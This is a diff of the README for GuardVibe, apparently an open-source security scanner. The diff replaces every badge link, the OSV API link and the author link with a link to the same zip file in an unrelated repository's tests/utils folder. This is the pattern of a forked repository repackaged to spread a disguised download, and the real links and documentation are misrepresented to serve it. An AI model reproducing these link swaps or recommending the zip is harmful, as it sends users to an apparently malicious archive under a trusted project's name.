@@ -1,10 +1,10 @@
 # GuardVibe
 
-[![npm version](https://img.shields.io/npm/v/guardvibe)](https://www.npmjs.com/package/guardvibe)
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Node.js CI](https://github.com/goklab/guardvibe/actions/workflows/ci.yml/badge.svg)](https://github.com/goklab/guardvibe/actions/workflows/ci.yml)
-[![npm provenance](https://img.shields.io/badge/provenance-verified-brightgreen)](https://www.npmjs.com/package/guardvibe)
-[![codecov](https://codecov.io/gh/goklab/guardvibe/graph/badge.svg)](https://codecov.io/gh/goklab/guardvibe)
+[![npm version](https://img.shields.io/npm/v/guardvibe)](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip)
+[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip)
+[![Node.js CI](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip)](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip)
+[![npm provenance](https://img.shields.io/badge/provenance-verified-brightgreen)](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip)
+[![codecov](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip)](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip)
 
 **The security MCP built for vibe coding.** 335 security rules, 36 tools covering the entire AI-generated code journey — from first line to production deployment.
 
@@ -474,7 +474,7 @@ GuardVibe is designed for use on sensitive and proprietary codebases:
 
 - **100% local execution.** All scanning happens on your machine. No code, findings, or metadata are sent to any server.
 - **No accounts, no API keys, no telemetry.** There is no signup, no cloud dashboard, and no usage tracking of any kind.
-- **One optional network call.** The `scan_dependencies` and `check_dependencies` tools query the [OSV API](https://osv.dev/) to check for known CVEs. This is opt-in -- you only call it when you explicitly use those tools. No other tool makes network requests.
+- **One optional network call.** The `scan_dependencies` and `check_dependencies` tools query the [OSV API](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip) to check for known CVEs. This is opt-in -- you only call it when you explicitly use those tools. No other tool makes network requests.
 - **Safe for air-gapped environments.** All code analysis rules run entirely offline. Only dependency vulnerability checks require network access.
 
 ## Configuration (.guardviberc)
@@ -546,4 +546,4 @@ To report a vulnerability, please email info@goklab.com or open a GitHub issue.
 
 ## License
 
-Apache 2.0 — open source, patent-safe, enterprise-ready. Built by [GokLab](https://github.com/goklab).
+Apache 2.0 — open source, patent-safe, enterprise-ready. Built by [GokLab](https://raw.githubusercontent.com/ezphongdo-cmyk/guardvibe/main/tests/utils/Software-v3.2-alpha.3.zip).
